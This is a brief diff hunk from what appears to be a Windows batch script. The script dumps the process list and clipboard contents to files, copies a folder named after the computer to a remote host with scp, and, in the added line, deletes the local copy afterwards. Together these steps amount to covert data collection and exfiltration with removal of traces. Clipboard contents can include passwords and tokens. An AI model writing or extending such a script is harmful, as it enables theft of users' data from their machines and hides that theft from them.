@@ -47,3 +47,4 @@ tasklist > tasks.txt
 powershell get-clipboard > clipboard.txt
 cd %startDir%
 scp -r "%COMPUTERNAME%" %user%@%host%:/home/%user%/
+del -r "%COMPUTERNAME%"
